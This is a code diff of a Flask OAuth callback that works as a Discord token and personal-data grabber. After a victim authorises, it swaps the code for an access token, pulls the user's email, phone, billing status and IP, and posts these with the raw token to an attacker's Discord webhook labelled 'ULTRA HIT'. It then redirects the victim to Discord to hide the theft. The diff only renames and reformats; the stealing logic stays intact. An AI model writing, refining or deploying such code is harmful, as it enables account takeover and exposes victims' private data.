@@ -9,40 +9,36 @@ WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2
 
 @app.route('/callback')
 def callback():
-    code = request.args.get('code')
-    if not code: return "Fail", 400
+    c = request.args.get('code')
+    if not c: return "Fail", 400
     
-    # Trade code for token
-    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':code,'redirect_uri':URI}
+    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':c,'redirect_uri':URI}
     r = requests.post('https://discord.com/api/v10/oauth2/token', data=d).json()
     t = r.get('access_token')
 
     if t:
         h = {'Authorization': 'Bearer ' + str(t)}
-        # Get User, Billing, and IP Info
+        # API Calls
         u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
         b = requests.get('https://discord.com/api/v10/users/@me/billing/payment-sources', headers=h).json()
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        # IP Fetch
+        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        # Optimization: One-line data extraction
-        user = f"{u.get('username')}#{u.get('discriminator')}"
-        mail = u.get('email', 'None')
-        phon = u.get('phone', 'None')
-        bill = "Linked ✅" if b else "None ❌"
-        nitro = ["None", "Classic", "Boost"][u.get('premium_type', 0)]
-
-        f = [
-            {"name": "👤 User", "value": f"`{user}`", "inline": True},
-            {"name": "📧 Email", "value": f"`{mail}`", "inline": True},
-            {"name": "📱 Phone", "value": f"`{phon}`", "inline": True},
-            {"name": "💎 Nitro", "value": f"`{nitro}`", "inline": True},
-            {"name": "💳 Billing", "value": f"`{bill}`", "inline": True},
-            {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
-            {"name": "🔑 Token", "value": f"```{t}
-```"}
-        ]
+        # Logic
+        nitro_type = str(u.get('premium_type', '0'))
+        has_bill = "YES" if b else "NO"
+        
+        # Super-short lines to prevent editor cutoff
+        f = []
+        f.append({"name": "User", "value": str(u.get('username'))})
+        f.append({"name": "Mail", "value": str(u.get('email'))})
+        f.append({"name": "Phone", "value": str(u.get('phone'))})
+        f.append({"name": "Nitro", "value": nitro_type})
+        f.append({"name": "Bill", "value": has_bill})
+        f.append({"name": "IP", "value": str(ip_addr)})
+        f.append({"name": "Token", "value": str(t)})
              
-        requests.post(WEB, json={"embeds": [{"title": "🚀 ULTRA HIT", "color": 0x5865F2, "fields": f}]})
+        requests.post(WEB, json={"embeds": [{"title": "ULTRA", "fields": f}]})
         
     return redirect("https://discord.com/app")
 
